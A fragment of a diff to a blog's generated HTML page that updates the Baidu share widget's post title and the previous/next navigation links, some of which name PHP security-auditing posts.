-                "common":{"bdSnsKey":{},"bdText":"Java学习笔记（四）--数组　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"异或构造字符串　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -521,15 +527,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/09/06/JAVA5/" title="上一篇: Java学习笔记（五）--类和对象">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/09/04/PHP-Phar/" title="下一篇: phar扩展在PHP反序列化中的利用">
+            <a href="/2018/09/16/PHP-Audit-Labs-Day2/" title="下一篇: PHP代码审计-filter_var函数缺陷">
                 <i class="fa fa-angle-right"></i>
             </a>
         
